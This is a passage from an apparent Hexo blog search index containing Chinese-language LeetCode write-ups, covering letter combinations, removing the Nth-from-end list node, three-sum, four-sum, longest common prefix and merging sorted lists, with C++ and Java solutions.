        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>17. 电话号码的字母组合</title>
    <url>/2018/09/10/LeetCode/leetcode-000017.%20%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E5%AD%97%E6%AF%8D%E7%BB%84%E5%90%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个仅包含数字 <code>2-9</code> 的字符串，返回所有它能表示的字母组合。</p>
<p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/original_images/17_telephone_keypad.png" alt></p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;23&quot;</span><br><span class="line">输出：[&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;].</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">letterCombinations</span><span class="params">(<span class="built_in">string</span> digits)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">res</span><span class="params">(<span class="number">1</span>,<span class="string">""</span>)</span></span>;</span><br><span class="line">        <span class="built_in">string</span> numap[] = &#123;<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"abc"</span>,<span class="string">"def"</span>,<span class="string">"ghi"</span>,<span class="string">"jkl"</span>,<span class="string">"mno"</span>,<span class="string">"pqrs"</span>,<span class="string">"tuv"</span>,<span class="string">"wxyz"</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digits.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;tmp;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res.size(); j++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; numap[digits[i] - <span class="string">'0'</span>].size(); k++)</span><br><span class="line">                    tmp.push_back(res[j] + numap[digits[i] - <span class="string">'0'</span>][k]);</span><br><span class="line">            res = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>19. 删除链表的倒数第N个节点</title>
    <url>/2018/09/10/LeetCode/leetcode-000019.%20%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%ACN%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个链表，删除链表的倒数第 <em>n</em> 个节点，并且返回链表的头结点。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定一个链表: <span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span>-&gt;<span class="number">5</span>, 和 n = <span class="number">2</span>.</span><br><span class="line"></span><br><span class="line">当删除了倒数第二个节点后，链表变为 <span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">3</span>-&gt;<span class="number">5</span>.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：双指针"><a href="#解法一：双指针" class="headerlink" title="解法一：双指针"></a>解法一：双指针</h3><p>采用两个指针，p1，p2。</p>
<p>初始时，p1,p2都指向列表头部的dummy节点（加入dummy节点是为了方便处理删除头部的情况），而后，p2向前走n步，p1不动。接着p1,p2同时向前行走，直到p2走到链表末尾，此时，p1刚好指向待删除节点的前一个节点，执行删除操作。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	    ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">	    dummy.next = head;</span><br><span class="line">	    ListNode p1 = dummy;</span><br><span class="line">	    ListNode p2 = dummy;</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">	        p1 = p1.next;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">while</span> (p1 != null) &#123;</span><br><span class="line">	        p1 = p1.next;</span><br><span class="line">	        p2 = p2.next;</span><br><span class="line">	    &#125;</span><br><span class="line">	    p2.next = p2.next.next;</span><br><span class="line">	    <span class="keyword">return</span> dummy.next;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>15. 三数之和</title>
    <url>/2018/09/10/LeetCode/leetcode-000015.%20%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？请你找出所有满足条件且不重复的三元组。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">4</span>]，</span><br><span class="line"></span><br><span class="line">满足要求的三元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">  [-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>答案中不可以包含重复的三元组。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">threeSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = num.size();</span><br><span class="line">        sort(num.begin(), num.end());</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; num[i] == num[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">int</span> target2 = <span class="number">0</span> - num[i];</span><br><span class="line">                twoSum(num, i+<span class="number">1</span>, target2, res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;sortedNum, <span class="keyword">int</span> start, <span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt;&amp;res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> head = start, tail = sortedNum.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(head &lt; tail) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = sortedNum[head] + sortedNum[tail];</span><br><span class="line">            <span class="keyword">if</span>(tmp &lt; target)</span><br><span class="line">                head++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(tmp &gt; target)</span><br><span class="line">                tail--;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.push_back(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;sortedNum[start<span class="number">-1</span>], sortedNum[head], sortedNum[tail]&#125;);</span><br><span class="line">                <span class="keyword">int</span> k = head+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(k &lt; tail &amp;&amp; sortedNum[k] == sortedNum[head])k++;</span><br><span class="line">                head = k;</span><br><span class="line">                </span><br><span class="line">                k = tail<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">while</span>(k &gt; head &amp;&amp; sortedNum[k] == sortedNum[tail])k--;</span><br><span class="line">                    tail = k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>18. 四数之和</title>
    <url>/2018/09/10/LeetCode/leetcode-000018.%20%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个包含 n 个整数的数组 nums 和一个目标值 target，判断 nums 中是否存在四个元素 a，b，c 和 d ，使得 a + b + c + d 的值与 target 相等？找出所有满足条件且不重复的四元组。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">2</span>, <span class="number">2</span>]，和 target = <span class="number">0</span>。</span><br><span class="line"></span><br><span class="line">满足要求的四元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-<span class="number">1</span>,  <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">  [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">  [-<span class="number">2</span>,  <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>答案中不可以包含重复的四元组。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">fourSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = num.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; res;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &gt; &gt;pairs;</span><br><span class="line">        pairs.reserve(n*n);</span><br><span class="line">        sort(num.begin(), num.end());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span> ; j &lt; n; j++)</span><br><span class="line">                pairs[num[i]+num[j]].push_back(make_pair(i,j));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">3</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span> &amp;&amp; num[i] == num[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; n - <span class="number">2</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j != i+<span class="number">1</span> &amp;&amp; num[j] == num[j<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(pairs.find(target - num[i] - num[j]) != pairs.end())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; &amp;sum2 = pairs[target - num[i] - num[j]];</span><br><span class="line">                    <span class="keyword">bool</span> isFirstPush = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; sum2.size(); k++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(sum2[k].first &lt;= j)<span class="keyword">continue</span>;</span><br><span class="line">                        <span class="keyword">if</span>(isFirstPush || (res.back())[<span class="number">2</span>] != num[sum2[k].first])</span><br><span class="line">                        &#123;</span><br><span class="line">                            res.push_back(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;num[i], num[j], num[sum2[k].first], num[sum2[k].second]&#125;);</span><br><span class="line">                            isFirstPush = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>14. 最长公共前缀</title>
    <url>/2018/09/10/LeetCode/leetcode-000014.%20%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数来查找字符串数组中的最长公共前缀。</p>
<p>如果不存在公共前缀，返回空字符串 <code>&quot;&quot;</code>。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="string">"flower"</span>,<span class="string">"flow"</span>,<span class="string">"flight"</span>]</span><br><span class="line">输出: <span class="string">"fl"</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="string">"dog"</span>,<span class="string">"racecar"</span>,<span class="string">"car"</span>]</span><br><span class="line">输出: <span class="string">""</span></span><br><span class="line">解释: 输入不存在公共前缀。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：暴力破解"><a href="#解法一：暴力破解" class="headerlink" title="解法一：暴力破解"></a>解法一：暴力破解</h3><p>以整个str[0]作为公共字串，遍历剩下的字符串，如果在任一个余下字符串中找不到str[0]或者str[0]不是在字符串首部出现，则将str[0]长度减一，继续遍历匹配剩下的字符串。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (strs.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">   String prefix = strs[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; strs.length; i++)</span><br><span class="line">       <span class="keyword">while</span> (strs[i].indexOf(prefix) != <span class="number">0</span>) &#123;</span><br><span class="line">           prefix = prefix.substring(<span class="number">0</span>, prefix.length() - <span class="number">1</span>);</span><br><span class="line">           <span class="keyword">if</span> (prefix.isEmpty()) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">       &#125;        </span><br><span class="line">   <span class="keyword">return</span> prefix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：暴力破解二"><a href="#解法二：暴力破解二" class="headerlink" title="解法二：暴力破解二"></a>解法二：暴力破解二</h3><p>和解法一不同，解法二是从str[0]的第一个字符开始，如果在剩下的字符串中匹配到了，再加入str[0]中第二个字符，继续遍历。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (strs == <span class="keyword">null</span> || strs.length == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].length(); i++) &#123;</span><br><span class="line">			<span class="keyword">char</span> c = strs[<span class="number">0</span>].charAt(i);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; strs.length; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (i == strs[j].length() || strs[j].charAt(i) != c)</span><br><span class="line">					<span class="keyword">return</span> strs[<span class="number">0</span>].substring(<span class="number">0</span>, i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> strs[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：分治法"><a href="#解法三：分治法" class="headerlink" title="解法三：分治法"></a>解法三：分治法</h3><p>将字符数组分作左半部分和右半部分，分别求出它们的最长公共前缀，再合并求它们的最长公共前缀。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs == <span class="keyword">null</span> || strs.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;    </span><br><span class="line">        <span class="keyword">return</span> longestCommonPrefix(strs, <span class="number">0</span> , strs.length - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">        <span class="keyword">return</span> strs[l];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (l + r)/<span class="number">2</span>;</span><br><span class="line">        String lcpLeft =   longestCommonPrefix(strs, l , mid);</span><br><span class="line">        String lcpRight =  longestCommonPrefix(strs, mid + <span class="number">1</span>,r);</span><br><span class="line">        <span class="keyword">return</span> commonPrefix(lcpLeft, lcpRight);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">String <span class="title">commonPrefix</span><span class="params">(String left,String right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min = Math.min(left.length(), right.length());       </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; min; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( left.charAt(i) != right.charAt(i) )</span><br><span class="line">            <span class="keyword">return</span> left.substring(<span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left.substring(<span class="number">0</span>, min);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：二分查找"><a href="#解法四：二分查找" class="headerlink" title="解法四：二分查找"></a>解法四：二分查找</h3><p>利用二分查找逼近最长公共前缀的长度。对每个长度L，判断str[0].subString(0, L)是否是所有的字符串的公共前缀。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs == <span class="keyword">null</span> || strs.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> minLen = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (String str : strs)</span><br><span class="line">        minLen = Math.min(minLen, str.length());</span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> high = minLen;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        <span class="keyword">int</span> middle = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (isCommonPrefix(strs, middle))</span><br><span class="line">            low = middle + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            high = middle - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> strs[<span class="number">0</span>].substring(<span class="number">0</span>, (low + high) / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isCommonPrefix</span><span class="params">(String[] strs, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    String str1 = strs[<span class="number">0</span>].substring(<span class="number">0</span>,len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; strs.length; i++)</span><br><span class="line">        <span class="keyword">if</span> (!strs[i].startsWith(str1))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/longest-common-prefix/solution/zui-chang-gong-gong-qian-zhui-by-leetcode/" target="_blank" rel="noopener">LeetCode-最长公共前缀题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>21. 合并两个有序链表</title>
    <url>/2018/09/10/LeetCode/leetcode-000021.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">4</span>, <span class="number">1</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span></span><br><span class="line">输出：<span class="number">1</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span>-&gt;<span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：遍历合并"><a href="#解法一：遍历合并" class="headerlink" title="解法一：遍历合并"></a>解法一：遍历合并</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;	</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == l1) &#123;</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == l2) &#123;</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		ListNode dummyNode = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">		ListNode dummy = dummyNode;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != l1 &amp;&amp; <span class="keyword">null</span> != l2) &#123;</span><br><span class="line">			<span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">				dummy.next = l1;</span><br><span class="line">				l1 = l1.next;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				dummy.next = l2;</span><br><span class="line">				l2 = l2.next;</span><br><span class="line">			&#125;</span><br><span class="line">			dummy = dummy.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		dummy.next = l1 == <span class="keyword">null</span> ? l2 : l1;</span><br><span class="line">		<span class="keyword">return</span> dummyNode.next;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：递归"><a href="#解法二：递归" class="headerlink" title="解法二：递归"></a>解法二：递归</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (null == l1) &#123;</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (null == l2) &#123;</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">			l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/solution/he-bing-liang-ge-you-xu-lian-biao-by-leetcode/" target="_blank" rel="noopener">LeetCode-合并两个有序链表-题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>22. 括号生成</title>
    <url>/2018/09/10/LeetCode/leetcode-000022.%20%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出 <em>n</em> 代表生成括号的对数，请你写出一个函数，使其能够生成所有可能的并且<strong>有效的</strong>括号组合。</p>
<p>例如，给出 <em>n</em> = 3，生成结果为：</p>
